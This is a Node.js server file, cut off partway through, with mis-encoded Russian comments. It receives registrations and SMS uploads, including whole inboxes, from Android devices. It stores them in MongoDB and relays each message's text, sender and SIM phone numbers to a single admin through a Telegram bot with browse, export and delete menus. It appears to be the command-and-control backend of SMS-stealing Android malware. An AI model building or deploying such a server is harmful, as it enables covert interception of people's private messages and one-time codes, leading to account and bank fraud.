require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const { Telegraf, Markup } = require('telegraf');
const mongoose = require('mongoose');
const Device = require('./models/Device');
const SmsMessage = require('./models/SmsMessage');
const moment = require('moment');

// –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã –∏–∑ .env
const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_USER_ID = process.env.ADMIN_USER_ID;
const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/izi_db';
const PORT = process.env.PORT || 3000;

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Express
const app = express();

// Middleware
app.use(cors());
app.use(bodyParser.json());

// –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è Telegram –±–æ—Ç–∞
const bot = new Telegraf(BOT_TOKEN);

// –ì–ª–æ–±–∞–ª—å–Ω—ã–π –¥–æ—Å—Ç—É–ø –∫ –±–æ—Ç—É –¥–ª—è –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –∏–∑ –ª—é–±–æ–≥–æ –º–µ—Å—Ç–∞ –∫–æ–¥–∞
global.bot = bot.telegram;

// –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ MongoDB
mongoose.connect(MONGODB_URI)
  .then(() => {
    console.log('–ü–æ–¥–∫–ª—é—á–µ–Ω–æ –∫ MongoDB');
  })
  .catch((err) => {
    console.error('–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ MongoDB:', err);
  });

// –ö–æ—Ä–Ω–µ–≤–æ–π –º–∞—Ä—à—Ä—É—Ç –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ä–∞–±–æ—Ç–æ—Å–ø–æ—Å–æ–±–Ω–æ—Å—Ç–∏
app.get('/', (req, res) => {
  res.send('–°–µ—Ä–≤–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç!');
});

// API –º–∞—Ä—à—Ä—É—Ç—ã
// 1. –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
app.post('/api/register-device', async (req, res) => {
  try {
    const { deviceId, deviceModel, androidVersion, simCards } = req.body;
    console.log(`–ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –Ω–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—é —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞: ${deviceId}, ${deviceModel}`);

    if (!deviceId || !deviceModel) {
      return res.status(400).json({
        success: false,
        message: '–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ª—è'
      });
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
    let device = await Device.findOne({ deviceId });

    if (device) {
      // –û–±–Ω–æ–≤–ª—è–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
      device.deviceModel = deviceModel;
      device.androidVersion = androidVersion;
      device.simCards = simCards;
      device.lastActiveAt = new Date();
      await device.save();
      console.log(`–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ ${deviceId} –æ–±–Ω–æ–≤–ª–µ–Ω–æ`);
    } else {
      // –°–æ–∑–¥–∞–µ–º –Ω–æ–≤–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
      device = new Device({
        deviceId,
        deviceModel,
        androidVersion,
        simCards
      });
      await device.save();
      console.log(`–ù–æ–≤–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ ${deviceId} –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ`);

      // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
      await notifyNewDevice(device);
    }

    res.status(200).json({
      success: true,
      message: '–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ —É—Å–ø–µ—à–Ω–æ –∑–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ',
      data: device
    });
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:', error);
    res.status(500).json({
      success: false,
      message: '–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞',
      error: error.message
    });
  }
});

// 2. –ü–æ–ª—É—á–µ–Ω–∏–µ SMS
app.post('/api/send-sms', async (req, res) => {
  try {
    const { sender, text, timestamp, simSlot, deviceId } = req.body;
    console.log(`–ü–æ–ª—É—á–µ–Ω–æ SMS –æ—Ç ${sender} –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ ${deviceId}, —Å–ª–æ—Ç ${simSlot}`);

    if (!sender || !text || !deviceId) {
      return res.status(400).json({
        success: false,
        message: '–û—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç –æ–±—è–∑–∞—Ç–µ–ª—å–Ω—ã–µ –ø–æ–ª—è'
      });
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ'
      });
    }

    // –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
    device.lastActiveAt = new Date();
    await device.save();

    // –°–æ—Ö—Ä–∞–Ω—è–µ–º SMS
    const smsMessage = new SmsMessage({
      sender,
      text,
      timestamp: timestamp ? new Date(timestamp) : new Date(),
      simSlot,
      deviceId
    });
    await smsMessage.save();
    console.log(`SMS –æ—Ç ${sender} —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ –≤ –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö`);

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
    await notifyNewSms(smsMessage, device);

    res.status(200).json({
      success: true,
      message: 'SMS —É—Å–ø–µ—à–Ω–æ –ø–æ–ª—É—á–µ–Ω–æ',
      data: smsMessage
    });
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ SMS:', error);
    res.status(500).json({
      success: false,
      message: '–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞',
      error: error.message
    });
  }
});

// 3. –ü–æ–ª—É—á–µ–Ω–∏–µ –º–∞—Å—Å–∏–≤–∞ SMS
app.post('/api/send-all-sms', async (req, res) => {
  try {
    const messages = req.body;
    console.log(`–ü–æ–ª—É—á–µ–Ω –º–∞—Å—Å–∏–≤ –∏–∑ ${messages.length} SMS —Å–æ–æ–±—â–µ–Ω–∏–π`);

    if (!Array.isArray(messages) || messages.length === 0) {
      return res.status(400).json({
        success: false,
        message: '–ú–∞—Å—Å–∏–≤ —Å–æ–æ–±—â–µ–Ω–∏–π –ø—É—Å—Ç –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–µ–Ω'
      });
    }

    // –ü–æ–ª—É—á–∞–µ–º deviceId –∏–∑ –ø–µ—Ä–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
    const deviceId = messages[0].deviceId;
    if (!deviceId) {
      return res.status(400).json({
        success: false,
        message: '–û—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç deviceId'
      });
    }

    // –ü—Ä–æ–≤–µ—Ä—è–µ–º, —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ
    const device = await Device.findOne({ deviceId });
    if (!device) {
      return res.status(404).json({
        success: false,
        message: '–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ'
      });
    }

    // –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
    device.lastActiveAt = new Date();
    await device.save();

    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤—Å–µ —Å–æ–æ–±—â–µ–Ω–∏—è
    const savedMessages = [];
    for (const message of messages) {
      const { sender, text, timestamp, simSlot } = message;
      
      const smsMessage = new SmsMessage({
        sender,
        text,
        timestamp: timestamp ? new Date(timestamp) : new Date(),
        simSlot: simSlot || 0,
        deviceId
      });
      await smsMessage.save();
      savedMessages.push(smsMessage);
    }
    console.log(`–°–æ—Ö—Ä–∞–Ω–µ–Ω–æ ${savedMessages.length} SMS —Å–æ–æ–±—â–µ–Ω–∏–π`);

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –≤ Telegram
    await notifyBulkSmsUpload(savedMessages.length, device);

    res.status(200).json({
      success: true,
      message: `–°–æ—Ö—Ä–∞–Ω–µ–Ω–æ ${savedMessages.length} SMS —Å–æ–æ–±—â–µ–Ω–∏–π`,
      data: { count: savedMessages.length }
    });
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –º–∞—Å—Å–æ–≤–æ–º —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ SMS:', error);
    res.status(500).json({
      success: false,
      message: '–û—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞',
      error: error.message
    });
  }
});

// –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π –≤ Telegram
// 1. –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
async function notifyNewDevice(device) {
  try {
    if (!global.bot) return;
    
    console.log(`–û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ ${device.deviceId} –≤ Telegram`);
    
    let message = `üîî *–ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ –Ω–æ–≤–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ!*\n\n`;
    message += `üì± *–ú–æ–¥–µ–ª—å:* ${device.deviceModel}\n`;
    message += `üÜî *ID:* \`${device.deviceId}\`\n`;
    message += `üì± *Android:* ${device.androidVersion}\n`;
    
    if (device.simCards && device.simCards.length > 0) {
      message += `\nüì∂ *SIM-–∫–∞—Ä—Ç—ã:*\n`;
      for (const sim of device.simCards) {
        message += `SIM${sim.slotIndex + 1}: ${sim.phoneNumber || '–ù–æ–º–µ—Ä –Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω'} (${sim.operatorName || '–û–ø–µ—Ä–∞—Ç–æ—Ä –Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω'})\n`;
      }
    }
    
    await global.bot.sendMessage(ADMIN_USER_ID, message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: 'üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', callback_data: `device:${device.deviceId}` }]
        ]
      }
    });
    console.log('–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ');
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –Ω–æ–≤–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:', error);
  }
}

// 2. –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–º SMS
async function notifyNewSms(smsMessage, device) {
  try {
    if (!global.bot) return;
    
    console.log(`–û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–º SMS –æ—Ç ${smsMessage.sender} –≤ Telegram`);
    
    let message = `‚úâÔ∏è *–ù–æ–≤–æ–µ SMS —Å–æ–æ–±—â–µ–Ω–∏–µ!*\n\n`;
    message += `üì± *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:* ${device.deviceModel}\n`;
    message += `üÜî *ID:* \`${device.deviceId}\`\n`;
    message += `üì± *–û—Ç:* ${smsMessage.sender}\n`;
    message += `üì∂ *SIM:* SIM${smsMessage.simSlot + 1}\n`;
    message += `üïí *–í—Ä–µ–º—è:* ${moment(smsMessage.timestamp).format('DD.MM.YYYY HH:mm')}\n\n`;
    message += `üí¨ *–¢–µ–∫—Å—Ç:*\n${smsMessage.text}`;
    
    await global.bot.sendMessage(ADMIN_USER_ID, message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: 'üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', callback_data: `device:${device.deviceId}` }]
        ]
      }
    });
    console.log('–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –Ω–æ–≤–æ–º SMS –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ');
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –Ω–æ–≤–æ–º SMS:', error);
  }
}

// 3. –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –º–∞—Å—Å–æ–≤–æ–π –∑–∞–≥—Ä—É–∑–∫–µ SMS
async function notifyBulkSmsUpload(count, device) {
  try {
    if (!global.bot) return;
    
    console.log(`–û—Ç–ø—Ä–∞–≤–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∑–∞–≥—Ä—É–∑–∫–µ ${count} SMS –≤ Telegram`);
    
    let message = `üì• *–ó–∞–≥—Ä—É–∂–µ–Ω—ã SMS —Å–æ–æ–±—â–µ–Ω–∏—è!*\n\n`;
    message += `üì± *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:* ${device.deviceModel}\n`;
    message += `üÜî *ID:* \`${device.deviceId}\`\n`;
    message += `‚úâÔ∏è *–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ:* ${count} —Å–æ–æ–±—â–µ–Ω–∏–π\n`;
    
    await global.bot.sendMessage(ADMIN_USER_ID, message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [{ text: 'üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', callback_data: `device:${device.deviceId}` }],
          [{ text: '‚úâÔ∏è –ü—Ä–æ—Å–º–æ—Ç—Ä SMS', callback_data: `sms:${device.deviceId}` }]
        ]
      }
    });
    console.log('–£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –º–∞—Å—Å–æ–≤–æ–π –∑–∞–≥—Ä—É–∑–∫–µ SMS –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ');
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –º–∞—Å—Å–æ–≤–æ–π –∑–∞–≥—Ä—É–∑–∫–µ SMS:', error);
  }
}

// –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –±–æ—Ç–∞ Telegram
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // –ü—Ä–æ–≤–µ—Ä–∫–∞, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º
  if (userId === ADMIN_USER_ID) {
    await ctx.reply('–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –ø–∞–Ω–µ–ª—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è! –í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:', {
      reply_markup: {
        inline_keyboard: [
          [{ text: 'üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', callback_data: 'devices' }]
        ]
      }
    });
  } else {
    await ctx.reply('–ò–∑–≤–∏–Ω–∏—Ç–µ, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.');
  }
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–ª–±—ç–∫–æ–≤ –æ—Ç –∏–Ω–ª–∞–π–Ω-–∫–Ω–æ–ø–æ–∫
bot.on('callback_query', async (ctx) => {
  const userId = ctx.from.id.toString();
  
  // –ü—Ä–æ–≤–µ—Ä–∫–∞, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º
  if (userId !== ADMIN_USER_ID) {
    await ctx.answerCbQuery('–£ –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–π —Ñ—É–Ω–∫—Ü–∏–∏');
    return;
  }

  const data = ctx.callbackQuery.data;
  
  try {
    // –£–¥–∞–ª—è–µ–º —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ –∫–æ–ª–±—ç–∫–µ
    await ctx.answerCbQuery();
    
    if (data === 'devices') {
      // –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
      await showDevicesList(ctx);
    } else if (data.startsWith('device:')) {
      // –î–µ—Ç–∞–ª–∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
      const deviceId = data.split(':')[1];
      await showDeviceDetails(ctx, deviceId);
    } else if (data.startsWith('sms:')) {
      // –°–ø–∏—Å–æ–∫ SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
      const deviceId = data.split(':')[1];
      await showDeviceSms(ctx, deviceId);
    } else if (data.startsWith('export:')) {
      // –≠–∫—Å–ø–æ—Ä—Ç –≤—Å–µ—Ö SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
      const deviceId = data.split(':')[1];
      await exportAllSms(ctx, deviceId);
    } else if (data === 'back_to_devices') {
      // –í–æ–∑–≤—Ä–∞—Ç –∫ —Å–ø–∏—Å–∫—É —É—Å—Ç—Ä–æ–π—Å—Ç–≤
      await showDevicesList(ctx);
    } else if (data === 'back_to_main') {
      // –í–æ–∑–≤—Ä–∞—Ç –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
      await ctx.editMessageText('–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ:', {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', callback_data: 'devices' }]
          ]
        }
      });
    } else if (data.startsWith('delete_device:')) {
      // –£–¥–∞–ª–µ–Ω–∏–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
      const deviceId = data.split(':')[1];
      await deleteDevice(ctx, deviceId);
    }
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –∫–æ–ª–±—ç–∫–∞:', error);
    await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –æ–ø–µ—Ä–∞—Ü–∏–∏.');
  }
});

// –§—É–Ω–∫—Ü–∏–∏ –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ –∫–æ–º–∞–Ω–¥ –±–æ—Ç–∞
// 1. –ü–æ–∫–∞–∑ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤
async function showDevicesList(ctx) {
  try {
    const devices = await Device.find().sort({ lastActiveAt: -1 });
    
    if (devices.length === 0) {
      await ctx.editMessageText('–£—Å—Ç—Ä–æ–π—Å—Ç–≤–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.', {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', callback_data: 'back_to_main' }]
          ]
        }
      });
      return;
    }
    
    let message = 'üì± *–î–æ—Å—Ç—É–ø–Ω—ã–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:*\n\n';
    const keyboard = [];
    
    for (const device of devices) {
      const lastActive = moment(device.lastActiveAt).format('DD.MM.YYYY HH:mm');
      
      message += `*${device.deviceModel}*\n`;
      message += `üÜî ID: \`${device.deviceId}\`\n`;
      message += `üì± Android: ${device.androidVersion}\n`;
      message += `üìÖ –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: ${lastActive}\n`;
      message += `üì∂ SIM-–∫–∞—Ä—Ç—ã: ${device.simCards.length}\n\n`;
      
      keyboard.push([{ text: `üì± ${device.deviceModel}`, callback_data: `device:${device.deviceId}` }]);
    }
    
    keyboard.push([{ text: 'üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', callback_data: 'back_to_main' }]);
    
    await ctx.editMessageText(message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: keyboard
      }
    });
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤:', error);
    await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —Å–ø–∏—Å–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤.');
  }
}

// 2. –ü–æ–∫–∞–∑ –¥–µ—Ç–∞–ª–µ–π —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
async function showDeviceDetails(ctx, deviceId) {
  try {
    const device = await Device.findOne({ deviceId });
    
    if (!device) {
      await ctx.editMessageText('–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.', {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', callback_data: 'devices' }]
          ]
        }
      });
      return;
    }
    
    // –ü–æ–ª—É—á–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    const smsCount = await SmsMessage.countDocuments({ deviceId });
    
    let message = `üì± *–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${device.deviceModel}*\n\n`;
    message += `üÜî ID: \`${device.deviceId}\`\n`;
    message += `üì± Android: ${device.androidVersion}\n`;
    message += `üìÖ –ó–∞—Ä–µ–≥–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–æ: ${moment(device.registeredAt).format('DD.MM.YYYY HH:mm')}\n`;
    message += `üìÖ –ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å: ${moment(device.lastActiveAt).format('DD.MM.YYYY HH:mm')}\n`;
    message += `‚úâÔ∏è SMS —Å–æ–æ–±—â–µ–Ω–∏–π: ${smsCount}\n\n`;
    
    if (device.simCards && device.simCards.length > 0) {
      message += `üì∂ *SIM-–∫–∞—Ä—Ç—ã:*\n`;
      for (const sim of device.simCards) {
        message += `SIM${sim.slotIndex + 1}: ${sim.phoneNumber || '–ù–æ–º–µ—Ä –Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω'} (${sim.operatorName || '–û–ø–µ—Ä–∞—Ç–æ—Ä –Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω'})\n`;
      }
    } else {
      message += `üì∂ *SIM-–∫–∞—Ä—Ç—ã:* –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç\n`;
    }
    
    const keyboard = [
      [{ text: '‚úâÔ∏è –ü—Ä–æ—Å–º–æ—Ç—Ä SMS', callback_data: `sms:${deviceId}` }],
      [{ text: 'üì• –≠–∫—Å–ø–æ—Ä—Ç –≤—Å–µ—Ö SMS', callback_data: `export:${deviceId}` }],
      [{ text: '‚ùå –£–¥–∞–ª–∏—Ç—å —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ', callback_data: `delete_device:${deviceId}` }],
      [{ text: 'üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', callback_data: 'back_to_devices' }],
      [{ text: 'üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', callback_data: 'back_to_main' }]
    ];
    
    await ctx.editMessageText(message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: keyboard
      }
    });
  } catch (error) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ:', error);
    await ctx.reply('–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ.');
  }
}

// 3. –ü–æ–∫–∞–∑ SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
async function showDeviceSms(ctx, deviceId) {
  try {
    const device = await Device.findOne({ deviceId });
    
    if (!device) {
      await ctx.editMessageText('–£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ.', {
        reply_markup: {
          inline_keyboard: [
            [{ text: 'üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', callback_data: 'devices' }]
          ]
        }
      });
      return;
    }
    
    // –ü–æ–ª—É—á–∞–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–µ 10 SMS –¥–ª—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
    const messages = await SmsMessage.find({ deviceId })
      .sort({ timestamp: -1 })
      .limit(10);
    
    let message = `‚úâÔ∏è *–ü–æ—Å–ª–µ–¥–Ω–∏–µ SMS –¥–ª—è ${device.deviceModel}:*\n\n`;
    
    if (messages.length === 0) {
      message += 'SMS —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç—Å—É—Ç—Å—Ç–≤—É—é—Ç.';
    } else {
      for (const sms of messages) {
        message += `üì± *–û—Ç:* ${sms.sender}\n`;
        message += `üí¨ *–¢–µ–∫—Å—Ç:* ${sms.text}\n`;
        message += `üïí *–í—Ä–µ–º—è:* ${moment(sms.timestamp).format('DD.MM.YYYY HH:mm')}\n`;
        message += `üì∂ *SIM:* SIM${sms.simSlot + 1}\n\n`;
      }
    }
    
    const keyboard = [
      [{ text: 'üì• –≠–∫—Å–ø–æ—Ä—Ç –≤—Å–µ—Ö SMS', callback_data: `export:${deviceId}` }],
      [{ text: 'üì± –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ', callback_data: `device:${deviceId}` }],
      [{ text: 'üì± –°–ø–∏—Å–æ–∫ —É—Å—Ç—Ä–æ–π—Å—Ç–≤', callback_data: 'back_to_devices' }],
      [{ text: 'üè† –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é', callback_data: 'back_to_main' }]
    ];
    
    await ctx.editMessageText(message, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: keyboard
      }
    });
  } catch (error) {
